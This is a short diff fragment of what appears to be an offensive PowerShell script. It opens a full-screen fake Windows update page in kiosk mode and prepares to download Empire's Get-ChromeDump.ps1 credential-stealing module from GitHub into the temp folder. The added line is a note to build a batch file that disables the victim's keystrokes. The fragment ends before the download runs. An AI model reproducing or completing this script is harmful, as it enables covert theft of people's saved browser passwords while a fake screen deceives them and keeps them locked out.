@@ -1,3 +1,5 @@
+ADD A Bat file that will dable all keystokes
+
 start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k https://fakeupdate.net/win10ue/index.html} 1>$null
 $url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
 $output = "$env:temp\file.psm1"
